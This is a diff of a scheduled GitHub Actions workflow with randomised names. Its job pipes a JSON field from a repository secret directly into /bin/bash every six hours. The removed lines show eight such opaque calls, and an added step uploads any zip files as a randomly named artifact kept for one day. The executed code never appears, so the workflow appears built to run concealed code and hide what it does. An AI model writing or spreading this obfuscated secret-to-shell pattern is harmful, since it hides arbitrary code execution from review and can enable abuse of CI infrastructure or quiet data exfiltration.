@@ -1,23 +1,24 @@
 name: fuxiangrongliang
 on:
   workflow_dispatch:
+
   schedule:
-    - cron: '16 4/6 * * *'
-jobs:  # 18227
+    - cron: '46 0,6,12,18 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: fuxiangrongliang
         env:
-          i59: ${{ secrets.i59 }}
+          vkwr202: ${{ secrets.vkwr202 }}
         run: |
-          echo $i59 | jq -r .r55 | /bin/bash
-          echo $ncf7391 | jq -r .tnav22933 | /bin/bash
-          echo $h5983 | jq -r .n90523 | /bin/bash
-          echo $rztj40490 | jq -r .fpft65117 | /bin/bash
-          echo $tgn149 | jq -r .w27132 | /bin/bash
-          echo $lu4858 | jq -r .x94 | /bin/bash
-          echo $lzg9 | jq -r .z09 | /bin/bash
-          echo $cf4693 | jq -r .jb83 | /bin/bash
+          printf '%s' "$vkwr202" | jq -r .tc69 | /bin/bash
+          echo $qfkb322 | jq -r .u30 | /bin/bash
 
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: Zv9mjQz8
+          path: "*.zip"
+          retention-days: 1
